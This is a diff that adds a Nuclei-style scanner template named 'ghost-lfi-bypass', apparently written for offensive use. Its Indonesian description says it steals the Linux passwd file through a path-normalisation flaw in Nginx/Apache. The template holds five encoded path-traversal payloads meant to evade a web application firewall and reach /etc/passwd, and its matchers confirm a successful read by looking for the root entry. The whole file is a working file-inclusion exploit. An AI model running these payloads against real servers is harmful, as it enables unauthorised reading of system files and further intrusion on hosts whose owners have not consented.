@@ -1,0 +1,31 @@
+id: ghost-lfi-bypass
+
+info:
+  name: Deep Local File Inclusion (LFI) via WAF Bypass
+  author: Sniper-Predator
+  severity: critical
+  description: Mencuri file passwd Linux melalui celah normalisasi path di Nginx/Apache.
+  tags: lfi,bypass,waf,critical,custom
+
+requests:
+  - method: GET
+    path:
+      # Double URL Encoding & Nginx Misconfig Bypasses
+      - "{{BaseURL}}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd"
+      - "{{BaseURL}}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+      - "{{BaseURL}}/static/..%2f..%2f..%2f..%2f..%2fetc/passwd"
+      - "{{BaseURL}}/assets/..%5c..%5c..%5c..%5cetc/passwd"
+      - "{{BaseURL}}//../../../../../../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+      # ANTI-HTML TRAP: File /etc/passwd adalah teks murni Linux, bukan HTML.
+      - type: word
+        words:
+          - "<html"
+          - "<!doctype"
+        condition: or
+        negative: true
